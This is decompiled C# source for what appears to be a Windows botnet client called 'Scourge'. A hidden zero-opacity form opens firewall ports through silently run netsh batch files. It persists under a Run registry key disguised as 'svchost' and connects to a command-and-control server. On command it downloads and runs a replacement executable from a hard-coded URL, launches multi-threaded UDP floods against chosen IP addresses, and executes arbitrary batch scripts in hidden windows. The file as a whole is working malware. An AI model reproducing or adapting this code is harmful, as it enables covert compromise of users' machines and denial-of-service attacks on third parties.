using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Configuration;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using ns3;

namespace ns2;

internal sealed class Form1 : Form
{
	public int int_0 = 48289;

	public float float_0 = 1.7f;

	public Thread thread_0;

	public IPEndPoint ipendPoint_0;

	public Socket socket_0 = null;

	public NetworkStream networkStream_0;

	public bool bool_0 = false;

	public Thread thread_1;

	private List<Thread> list_0;

	private bool bool_1 = false;

	private byte[] byte_0;

	private IPEndPoint ipendPoint_1;

	public string string_0 = Path.GetFileNameWithoutExtension(Application.get_ExecutablePath());

	public string string_1 = Path.GetFileName(Application.get_ExecutablePath());

	public string string_2 = Application.get_ExecutablePath();

	public string string_3 = Application.get_StartupPath();

	private IContainer icontainer_0 = null;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		string value = "netsh advfirewall firewall add rule name=”Open Port 48289” dir=in action=allow protocol=TCP localport=48289";
		string text = Path.GetTempPath() + "winfirewall45.bat";
		StreamWriter streamWriter = new StreamWriter(text);
		streamWriter.WriteLine("@echo off");
		streamWriter.WriteLine(value);
		streamWriter.Flush();
		streamWriter.Close();
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text);
		processStartInfo.CreateNoWindow = true;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		Process.Start(processStartInfo);
		processStartInfo = null;
		string value2 = "netsh advfirewall firewall add rule name=”" + string_1 + "” dir=in action=allow program=”" + Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + string_1 + "” enable=yes remoteip=Any,LocalSubnet profile=all";
		string text2 = Path.GetTempPath() + "winfirewall373.bat";
		StreamWriter streamWriter2 = new StreamWriter(text2);
		streamWriter2.WriteLine("@echo off");
		streamWriter2.WriteLine(value2);
		streamWriter2.Flush();
		streamWriter2.Close();
		processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.CreateNoWindow = true;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		Process.Start(processStartInfo);
		processStartInfo = null;
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		if (registryKey.GetValue("svchost") == null)
		{
			registryKey.SetValue("svchost", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + string_1);
		}
		if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + string_1))
		{
			File.Move(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + string_1);
			Application.Restart();
		}
		else
		{
			try
			{
				File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + string_1);
				File.Move(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + string_1);
			}
			catch
			{
			}
		}
		ipendPoint_0 = new IPEndPoint(Dns.GetHostAddresses(Class11.Default.DNS)[0], int_0);
		thread_1 = new Thread(method_0);
		thread_1.IsBackground = true;
		thread_1.Start();
		thread_0 = new Thread(method_2);
		thread_0.IsBackground = true;
		method_1(bool_2: true);
	}

	public void method_0()
	{
		while (true)
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			if (registryKey.GetValue("svchost") == null)
			{
				registryKey.SetValue("svchost", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + string_1);
			}
		}
	}

	public void method_1(bool bool_2)
	{
		while (true)
		{
			try
			{
				socket_0 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
				socket_0.Connect(ipendPoint_0);
				if (socket_0.Connected)
				{
					networkStream_0 = new NetworkStream(socket_0, ownsSocket: true);
					byte[] array = method_5("~I:Bot~" + float_0 + "~" + Environment.OSVersion.Platform.ToString() + "!");
					networkStream_0.Write(array, 0, array.Length);
					networkStream_0.Flush();
					if (bool_2)
					{
						thread_0.Start();
					}
				}
				break;
			}
			catch
			{
			}
		}
	}

	public void method_2()
	{
		while (true)
		{
			try
			{
				if (socket_0 == null || !socket_0.Connected)
				{
					continue;
				}
				string text = string.Empty;
				List<char> list = new List<char>();
				while (true)
				{
					int num = networkStream_0.ReadByte();
					char item = (char)num;
					if (num == -1 || item.ToString() == "!")
					{
						break;
					}
					list.Add(item);
				}
				char[] array = list.ToArray();
				foreach (char c in array)
				{
					text += c.ToString().Replace("\0", "");
				}
				switch (text)
				{
				case "~Sent:testmsg~":
				{
					byte[] array3 = method_5("~Sent:tstmsgreply~!");
					networkStream_0.Write(array3, 0, array3.Length);
					networkStream_0.Flush();
					break;
				}
				case "~Sent:DC~":
					socket_0.Disconnect(reuseSocket: true);
					method_1(bool_2: false);
					break;
				case "~Sent:Acti~":
					Class11.Default.Active = true;
					((SettingsBase)Class11.Default).Save();
					break;
				case "~Sent:DeAct~":
					Class11.Default.Active = false;
					((SettingsBase)Class11.Default).Save();
					break;
				case "~EndFlood~":
				{
					bool_1 = false;
					Thread[] array2 = list_0.ToArray();
					foreach (Thread thread in array2)
					{
						thread.Abort();
					}
					break;
				}
				case "~Erase~":
				{
					thread_1.Abort();
					RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
					if (registryKey.GetValue("svchost") != null)
					{
						registryKey.DeleteValue("svchost");
					}
					Application.Exit();
					break;
				}
				}
				if (text.Contains("~Update~"))
				{
					try
					{
						WebClient webClient = new WebClient();
						byte[] bytes = webClient.DownloadData(webClient.Proxy!.GetProxy(new Uri("http://steveschoice.com/Scourge/Infection/svchost.exe")));
						if (File.Exists(string_3 + "\\" + string_0 + ".old"))
						{
							File.Delete(string_3 + "\\" + string_0 + ".old");
						}
						File.Move(string_2, string_3 + "\\" + string_0 + ".old");
						File.WriteAllBytes(string_2, bytes);
						Application.DoEvents();
						BinaryWriter binaryWriter = new BinaryWriter(new FileStream(string_2, FileMode.Open, FileAccess.Write));
						binaryWriter.Seek(int.Parse(text.Remove(0, 8)), SeekOrigin.Begin);
						binaryWriter.Write(Class11.Default.DNS.ToCharArray());
						binaryWriter.Flush();
						binaryWriter.Close();
						Application.Restart();
					}
					catch
					{
					}
				}
				if (!Class11.Default.Active)
				{
					continue;
				}
				if (text.Contains("~LFlood:~"))
				{
					string text2 = text.Remove(0, 9);
					string text3 = "";
					string text4 = "";
					for (int j = 0; j < text2.Length && text2[j].ToString() != ">"; j++)
					{
						text3 += text2[j];
					}
					text4 = text2.Replace(text3, "");
					text3 = text3.Replace(">", "");
					text4 = text2.Replace(text3, "");
					text4 = text4.Replace(">", "");
					method_3(1, new IPEndPoint(IPAddress.Parse(text3), int.Parse(text4)));
					bool_1 = true;
				}
				if (text.Contains("~MFlood:~"))
				{
					string text2 = text.Remove(0, 9);
					string text3 = "";
					string text4 = "";
					for (int j = 0; j < text2.Length && text2[j].ToString() != ">"; j++)
					{
						text3 += text2[j];
					}
					text4 = text2.Replace(text3, "");
					text3 = text3.Replace(">", "");
					text4 = text2.Replace(text3, "");
					text4 = text4.Replace(">", "");
					method_3(2, new IPEndPoint(IPAddress.Parse(text3), int.Parse(text4)));
					bool_1 = true;
				}
				if (text.Contains("~HFlood:~"))
				{
					string text2 = text.Remove(0, 9);
					string text3 = "";
					string text4 = "";
					for (int j = 0; j < text2.Length && text2[j].ToString() != ">"; j++)
					{
						text3 += text2[j];
					}
					text4 = text2.Replace(text3, "");
					text3 = text3.Replace(">", "");
					text4 = text2.Replace(text3, "");
					text4 = text4.Replace(">", "");
					method_3(3, new IPEndPoint(IPAddress.Parse(text3), int.Parse(text4)));
					bool_1 = true;
				}
				if (text.Contains("~SFlood:~"))
				{
					string text2 = text.Remove(0, 9);
					string text3 = "";
					string text4 = "";
					for (int j = 0; j < text2.Length && text2[j].ToString() != ">"; j++)
					{
						text3 += text2[j];
					}
					text4 = text2.Replace(text3, "");
					text3 = text3.Replace(">", "");
					text4 = text2.Replace(text3, "");
					text4 = text4.Replace(">", "");
					method_3(4, new IPEndPoint(IPAddress.Parse(text3), int.Parse(text4)));
					bool_1 = true;
				}
				if (text.Contains("~Script:"))
				{
					string value = text.Remove(0, 8);
					string text5 = Path.GetTempPath() + "bScript.bat";
					StreamWriter streamWriter = new StreamWriter(text5);
					streamWriter.WriteLine("@echo off");
					streamWriter.WriteLine(value);
					streamWriter.Flush();
					streamWriter.Close();
					ProcessStartInfo processStartInfo = new ProcessStartInfo(text5);
					processStartInfo.CreateNoWindow = true;
					processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					Process.Start(processStartInfo);
					processStartInfo = null;
				}
			}
			catch
			{
				socket_0.Disconnect(reuseSocket: true);
				method_1(bool_2: false);
			}
		}
	}

	public void method_3(int int_1, IPEndPoint ipendPoint_2)
	{
		ipendPoint_1 = ipendPoint_2;
		MemoryStream memoryStream = new MemoryStream(Class12.smethod_1());
		BinaryReader binaryReader = new BinaryReader(memoryStream);
		byte_0 = binaryReader.ReadBytes(1024);
		memoryStream.Dispose();
		list_0 = new List<Thread>();
		if (int_1 == 1)
		{
			for (int i = 0; i < 50; i++)
			{
				list_0.Add(new Thread(method_4));
				list_0[i].IsBackground = true;
				list_0[i].Start();
			}
		}
		if (int_1 == 2)
		{
			for (int i = 0; i < 100; i++)
			{
				list_0.Add(new Thread(method_4));
				list_0[i].IsBackground = true;
				list_0[i].Start();
			}
		}
		if (int_1 == 3)
		{
			for (int i = 0; i < 150; i++)
			{
				list_0.Add(new Thread(method_4));
				list_0[i].IsBackground = true;
				list_0[i].Start();
			}
		}
		if (int_1 == 4)
		{
			for (int i = 0; i < 200; i++)
			{
				list_0.Add(new Thread(method_4));
				list_0[i].IsBackground = true;
				list_0[i].Start();
			}
		}
	}

	private void method_4()
	{
		Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
		while (bool_1)
		{
			try
			{
				socket.SendTo(byte_0, SocketFlags.None, ipendPoint_1);
			}
			catch
			{
			}
		}
	}

	public byte[] method_5(string string_4)
	{
		return Encoding.Unicode.GetBytes(string_4);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((Control)this).set_AccessibleRole((AccessibleRole)0);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(10, 10));
		((Form)this).set_ControlBox(false);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
